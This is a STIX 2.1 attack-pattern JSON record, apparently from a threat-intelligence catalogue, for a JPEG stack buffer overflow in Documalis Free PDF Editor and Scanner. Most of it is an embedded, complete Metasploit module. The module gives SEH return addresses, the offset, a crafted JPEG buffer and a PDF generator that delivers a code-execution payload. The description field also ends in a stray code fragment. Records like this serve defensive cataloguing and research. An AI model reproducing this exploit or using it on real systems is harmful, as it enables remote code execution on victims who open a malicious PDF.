{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f3a484d8-ef92-4dd8-b033-a5dd2dd0e1d8",
    "created": "2024-08-14T16:35:34.999067Z",
    "modified": "2024-08-14T16:35:34.99907Z",
    "name": "Documalis Free PDF Editor and Scanner JPEG Stack Buffer Overflow",
    "description": " Documalis Free PDF Editor version 5.7.2.26 and Documalis Free PDF Scanner version 5.7.2.122 do not appropriately validate the contents of JPEG images contained within a PDF. Attackers can exploit this vulnerability to trigger a buffer overflow on the stack and gain remote code execution as the user running the Documalis Free PDF Editor or Documalis Free PDF Scanner software.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/documalis_pdf_editor_and_scanner.rb",
            "external_id": "documalis_pdf_editor_and_scanner.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::PDF\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Documalis Free PDF Editor and Scanner JPEG Stack Buffer Overflow',\n        'Description' => %q{\n          Documalis Free PDF Editor version 5.7.2.26 and Documalis Free PDF Scanner version 5.7.2.122 do not\n          appropriately validate the contents of JPEG images contained within a PDF. Attackers can exploit\n          this vulnerability to trigger a buffer overflow on the stack and gain remote code execution as the\n          user running the Documalis Free PDF Editor or Documalis Free PDF Scanner software.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'metacom', # Vulnerability discovery and PoC\n          '<metacom27[at]gmail.com>', # Metasploit module\n        ],\n        'References' => [\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'process'\n        },\n        'Platform' => 'win',\n        'Payload' => {\n          'Space' => 1715,\n          'DisableNops' => true\n        },\n        'Targets' => [\n          [\n            'Documalis Free PDF Editor v.5.7.2.26 / Win 7, Win 10',\n            {\n              'Ret' => 0x0040160D, # pop esi # pop ebx # ret  - PDFEditor.exe\n              'Offset' => 433\n            }\n          ],\n          [\n            'Documalis Free PDF Scanner v.5.7.2.122 / Win 7, Win 10',\n            {\n              'Ret' => 0x004023FC, # pop edx # pop ebx # ret  - DocumentScanner.exe\n              'Offset' => 433\n            }\n          ]\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'Privileged' => false,\n        'DisclosureDate' => '2020-05-22',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.pdf']),\n      ]\n    )\n  end\n\n  def exploit\n    file_create(make_pdf)\n  end\n\n  def jpeg\n    buffer = \"\\xFF\\xD8\\xFF\\xEE\\x00\\x0E\\x41\\x64\\x6F\\x62\\x65\\x00\\x64\\x80\\x00\\x00\"\n    buffer << \"\\x00\\x02\\xFF\\xDB\\x00\\x84\\x00\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\"\n    buffer << \"\\x02\\x03\\x02\\x02\\x02\\x03\\x04\\x03\\x03\\x03\\x03\\x04\\x05\\x04\\x04\\x04\"\n    buffer << \"\\x04\\x04\\x05\\x05\\x05\\x05\\x05\\x05\\x05\\x05\\x05\\x05\\x07\\x08\\x08\\x08\"\n    buffer << \"\\x07\\x05\\x09\\x0A\\x0A\\x0A\\x0A\\x09\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\"\n    buffer << \"\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x01\\x03\\x02\\x02\\x03\\x03\\x03\\x07\\x05\"\n    buffer << \"\\x05\\x07\\x0D\\x0A\\x09\\x0A\\x0D\\x0F\\x0D\\x0D\\x0D\\x0D\\x0F\\x0F\\x0C\\x0C\"\n    buffer << \"\\x0C\\x0C\\x0C\\x0F\\x0F\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0F\\x0C\\x0E\\x0E\\x0E\"\n    buffer << \"\\x0E\\x0E\\x0C\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\"\n    buffer << \"\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\xFF\\xC0\\x00\\x14\\x08\\x00\\x32\\x00\"\n    buffer << \"\\xE6\\x04\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01\\x04\\x11\\x00\\xFF\\xC4\"\n    buffer << \"\\x01\\xA2\\x00\\x00\\x00\\x07\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\"\n    buffer << \"\\x00\\x00\\x00\\x04\\x05\\x03\\x02\\x06\\x01\\x00\\x07\\x08\\x09\\x0A\\x0B\\x01\"\n    buffer << \"\\x54\\x02\\x02\\x03\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    buffer << \"\\x01\\x00\\x02\\x03\\x04\\x05\\x06\\x07\"\n    buffer << rand_text(target['Offset']) # Junk\n    buffer << generate_seh_record(target.ret)\n    buffer << payload.encoded\n    buffer << rand_text(2388 - buffer.length)\n    buffer\n  end\n\n  def make_pdf\n    @pdf << header\n    add_object(1, '<</Type/Catalog/Outlines 2 0 R /Pages 3 0 R>>')\n    add_object(2, '<</Type/Outlines>>')\n    add_object(3, '<</Type/Pages/Kids[5 0 R]/Count 1/Resources <</ProcSet 4 0 R/XObject <</I0 7 0 R>>>>/MediaBox[0 0 612.0 792.0]>>')\n    add_object(4, '[/PDF/Text/ImageC]')\n    add_object(5, '<</Type/Page/Parent 3 0 R/Contents 6 0 R>>')\n    stream_1 = 'stream' << eol\n    stream_1 << '0.000 0.000 0.000 rg 0.000 0.000 0.000 RG q 265.000 0 0 229.000 41.000 522.000 cm /I0 Do Q' << eol\n    stream_1 << 'endstream' << eol\n    add_object(6, \"<</Length 91>>#{stream_1}\")\n    stream = '<<' << eol\n    stream << '/Width 230' << eol\n    stream << '/BitsPerComponent 8' << eol\n    stream << '/Name /X' << eol\n    stream << '/Height 50' << eol\n    stream << '/Intent /RelativeColorimetric' << eol\n    stream << '/Subtype /Image' << eol\n    stream << '/Filter /DCTDecode' << eol\n    stream << \"/Length #{jpeg.length}\" << eol\n    stream << '/ColorSpace /DeviceCMYK' << eol\n    stream << '/Type /XObject' << eol\n    stream << '>>'\n    stream << 'stream' << eol\n    stream << jpeg << eol\n    stream << 'endstream' << eol\n    add_object(7, stream)\n    finish_pdf\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-05-22",
    "x_mitre_platforms": [
        "win'"
    ]
}